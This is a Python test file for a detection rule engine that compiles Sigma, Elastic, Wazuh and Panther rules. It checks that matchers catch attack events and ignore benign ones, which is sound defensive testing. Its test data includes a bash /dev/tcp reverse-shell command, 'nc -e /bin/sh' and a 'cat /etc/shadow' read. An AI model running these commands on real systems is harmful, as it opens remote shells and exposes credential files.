"""Tests for the multi-platform rule engine (sigma / elastic / wazuh / panther).

Locks in the behaviors found during live bring-up:
- Compiled matchers never fire on an empty event (the degenerate-rule guard)
- Benign events score zero across the whole catalog
- Correctly-shaped attack events hit real rules, citing engine + rule_id
- Sigma condition compilation handles of/all/not/and/or correctly
- KQL ``field:*`` existence semantics do not match missing fields
- Panther rules execute real rule() functions from source
"""
from __future__ import annotations

import base64
from unittest.mock import patch

import pytest

from app_shared import rule_engine as re_mod
from app_shared.rule_engine import (
    CompiledCatalog,
    compile_elastic,
    compile_panther,
    compile_sigma,
    compile_wazuh,
    event_doc,
)


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


# ---------------------------------------------------------------------------
# Sigma compilation
# ---------------------------------------------------------------------------

class TestSigmaCompilation:
    def test_keyword_rule_matches_payload(self):
        doc = {
            "detection": {
                "keywords": ["bash -i >& /dev/tcp/", "nc -e /bin/sh"],
                "condition": "keywords",
            }
        }
        matcher, err = compile_sigma(doc)
        assert matcher is not None, err
        assert matcher(event_doc({"payload": _b64("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")})) is True
        assert matcher(event_doc({"payload": _b64("GET / HTTP/1.1 Host: cdn.example.com")})) is False

    def test_field_rule_with_modifier(self):
        doc = {
            "detection": {
                "selection": {"CommandLine|contains": "/etc/shadow"},
                "condition": "selection",
            }
        }
        matcher, err = compile_sigma(doc)
        assert matcher is not None
        assert matcher(event_doc({"process_command_line": "cat /etc/shadow"})) is True
        assert matcher(event_doc({"process_command_line": "cat /etc/hosts"})) is False

    def test_condition_and_or_not(self):
        det = {
            "sel_a": {"Image|endswith": "/nmap"},
            "sel_b": {"CommandLine|contains": "-p-"},
            "condition": "sel_a and not sel_b",
        }
        matcher, err = compile_sigma({"detection": det})
        assert matcher is not None

        def _doc(image, cmdline):
            # Image|endswith maps onto process fields via _field_getter tail
            return event_doc({"process_name": image, "process_command_line": cmdline})

        assert matcher(_doc("/usr/bin/nmap", "-sS 10.0.0.1")) is True
        assert matcher(_doc("/usr/bin/nmap", "-sS -p- 10.0.0.1")) is False

    def test_condition_of_expansion(self):
        det = {
            "selection_1": {"CommandLine|contains": "whoami"},
            "selection_2": {"CommandLine|contains": "net user"},
            "condition": "1 of selection_*",
        }
        matcher, err = compile_sigma({"detection": det})
        assert matcher is not None
        assert matcher(event_doc({"process_command_line": "whoami"})) is True
        assert matcher(event_doc({"process_command_line": "ls -la"})) is False

    def test_no_detection_block_skips(self):
        matcher, reason = compile_sigma({"title": "x"})
        assert matcher is None
        assert reason

    def test_empty_condition_fails_closed(self):
        det = {"selection": {"CommandLine|contains": "evil"}, "condition": "unknown_name"}
        matcher, reason = compile_sigma({"detection": det})
        # Unknown names compile to False operands -> matcher exists but never fires
        if matcher is not None:
            assert matcher(event_doc({"process_command_line": "evil"})) is False


# ---------------------------------------------------------------------------
# Elastic compilation
# ---------------------------------------------------------------------------

class TestElasticCompilation:
    def test_kql_field_value(self):
        doc = {"rule": {"language": "kuery", "query": "process.name:nmap"}}
        matcher, err = compile_elastic(doc)
        assert matcher is not None, err
        assert matcher(event_doc({"process_name": "nmap"})) is True
        assert matcher(event_doc({"process_name": "curl"})) is False

    def test_kql_exists_star_never_matches_missing_field(self):
        # KQL ``field:*`` means field exists; missing/empty must be False.
        # (A PURE existence query is skipped as an enrich-index rule, so use
        # a compound query to exercise the per-clause semantics.)
        doc = {"rule": {"language": "kuery", "query": "url.path:* and process.name:nmap"}}
        matcher, err = compile_elastic(doc)
        assert matcher is not None
        assert matcher(event_doc({"process_name": "nmap"})) is False
        assert matcher(event_doc({"path": "/x", "process_name": "nmap"})) is True

    def test_existence_only_query_is_skipped(self):
        # Enrich-index rules (threat intel joins) fire on everything without
        # their index; the compiler must refuse them with a reason.
        doc = {"rule": {"language": "kuery", "query": "source.ip:* or destination.ip:*"}}
        matcher, reason = compile_elastic(doc)
        assert matcher is None
        assert "existence-only" in reason

    def test_eql_where(self):
        doc = {"rule": {"language": "eql", "query": "network where network.transport = \"tcp\""}}
        matcher, err = compile_elastic(doc)
        assert matcher is not None, err
        assert matcher(event_doc({"network_transport": "tcp"})) is True
        assert matcher(event_doc({"network_transport": "udp"})) is False


# ---------------------------------------------------------------------------
# Panther compilation
# ---------------------------------------------------------------------------

class TestPantherCompilation:
    def test_rule_fn_executes(self, tmp_path):
        rule_py = tmp_path / "r.py"
        rule_py.write_text(
            "def rule(event):\n"
            "    return event.get('payload', '').find('/etc/shadow') != -1\n"
        )
        matcher, err = compile_panther({}, str(rule_py))
        assert matcher is not None, err
        assert matcher(event_doc({"payload": _b64("cat /etc/shadow")})) is True
        assert matcher(event_doc({"payload": _b64("cat /etc/hosts")})) is False

    def test_return_true_stub_is_caught_by_guard(self, tmp_path):
        rule_py = tmp_path / "stub.py"
        rule_py.write_text("def rule(event):\n    return True\n")
        matcher, err = compile_panther({}, str(rule_py))
        assert matcher is not None  # compiles...
        # ...but the catalog guard rejects it: fires on empty event
        assert matcher(event_doc({})) is True

    def test_missing_source_skips(self):
        matcher, reason = compile_panther({}, "/nonexistent/rule.py")
        assert matcher is None
        assert reason


# ---------------------------------------------------------------------------
# Wazuh compilation (from source XML)
# ---------------------------------------------------------------------------

class TestWazuhCompilation:
    def _write_xml(self, tmp_path):
        xml = tmp_path / "rules.xml"
        xml.write_text(
            '<group name="local,syslog,sshd,">\n'
            '  <rule id="100001" level="5">\n'
            '    <match>Failed password</match>\n'
            '    <description>sshd: authentication failed.</description>\n'
            '  </rule>\n'
            '</group>'
        )
        return str(xml)

    def test_match_pattern_from_xml(self, tmp_path):
        xml = self._write_xml(tmp_path)
        doc = {"rule_id": "wazuh-100001", "group": "syslog", "level": 5}
        matcher, err = compile_wazuh(doc, xml)
        assert matcher is not None, err
        assert matcher(event_doc({"message": "sshd: Failed password for root from 1.2.3.4"})) is True
        assert matcher(event_doc({"message": "Accepted publickey for dev"})) is False

    def test_rule_id_not_in_xml_skips(self, tmp_path):
        xml = self._write_xml(tmp_path)
        doc = {"rule_id": "wazuh-999999"}
        matcher, reason = compile_wazuh(doc, xml)
        assert matcher is None
        assert "not in xml" in reason


# ---------------------------------------------------------------------------
# Catalog-level guards
# ---------------------------------------------------------------------------

class TestCatalogGuards:
    def _catalog_with(self, rows):
        cat = CompiledCatalog()
        with patch.object(re_mod, "event_doc", re_mod.event_doc):
            cat.compile_from_rows(rows)
        return cat

    def test_degenerate_matcher_is_skipped(self):
        rows = [{
            "rule_id": "stub-1", "engine": "panther", "title": "Stub",
            "severity": "high", "technique_ids": [], "file_path": None,
            "raw": "{}",
        }]
        cat = self._catalog_with(rows)
        assert cat.by_engine.get("panther", 0) == 0

    def test_real_matcher_is_kept(self, tmp_path):
        rule_py = tmp_path / "real.py"
        rule_py.write_text("def rule(event):\n    return 'exploit' in str(event.get('message', ''))\n")
        rows = [{
            "rule_id": "real-1", "engine": "panther", "title": "Real",
            "severity": "high", "technique_ids": ["T1203"], "file_path": str(rule_py),
            "raw": "{}",
        }]
        cat = self._catalog_with(rows)
        assert cat.by_engine.get("panther", 0) == 1
        hits = cat.evaluate([{"message": "exploit attempt"}, {"message": "benign"}])
        assert len(hits) == 1
        assert hits[0]["rule_id"] == "real-1"
        assert hits[0]["engine"] == "panther"

    def test_unsupported_engine_is_ignored(self):
        rows = [{"rule_id": "x", "engine": "snort", "title": "X", "raw": "{}"}]
        cat = self._catalog_with(rows)
        assert cat.matchers == []


# ---------------------------------------------------------------------------
# Whole-catalog sanity (requires the real store; skipped if empty)
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def real_catalog():
    try:
        cat = re_mod.load_catalog_from_store()
    except Exception:
        pytest.skip("rules store unavailable")
    if not cat.matchers:
        pytest.skip("rules store empty")
    return cat


class TestRealCatalog:
    def test_no_matcher_fires_on_empty_event(self, real_catalog):
        empty = event_doc({})
        for m in real_catalog.matchers:
            try:
                assert m["match"](empty) is False, f"degenerate matcher: {m['rule_id']}"
            except Exception:
                pass

    def test_benign_traffic_scores_zero(self, real_catalog):
        benign = event_doc({
            "title": "1.2.3.4 -> 5.6.7.8", "network_transport": "tcp",
            "destination_port": "443",
            "payload": _b64("GET / HTTP/1.1\r\nHost: cdn.example.com\r\n"),
            "source_ip": "1.2.3.4", "destination_ip": "5.6.7.8",
        })
        hits = [m for m in real_catalog.matchers if _safe(m, benign)]
        assert hits == []

    def test_reverse_shell_hits_sigma(self, real_catalog):
        doc = event_doc({"payload": _b64("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
                         "source_ip": "9.9.9.9"})
        hits = [m for m in real_catalog.matchers if _safe(m, doc)]
        assert any(m["engine"] == "sigma" for m in hits)
        assert any("/dev/tcp" in m["title"].lower() or "reverse shell" in m["title"].lower()
                   for m in hits if m["engine"] == "sigma")

    def test_shadow_read_hits(self, real_catalog):
        doc = event_doc({"process_name": "cat", "process_command_line": "cat /etc/shadow",
                         "source_ip": "9.9.9.9"})
        hits = [m for m in real_catalog.matchers if _safe(m, doc)]
        assert hits, "expected at least one rule for /etc/shadow access"


def _safe(m, doc):
    try:
        return m["match"](doc)
    except Exception:
        return False
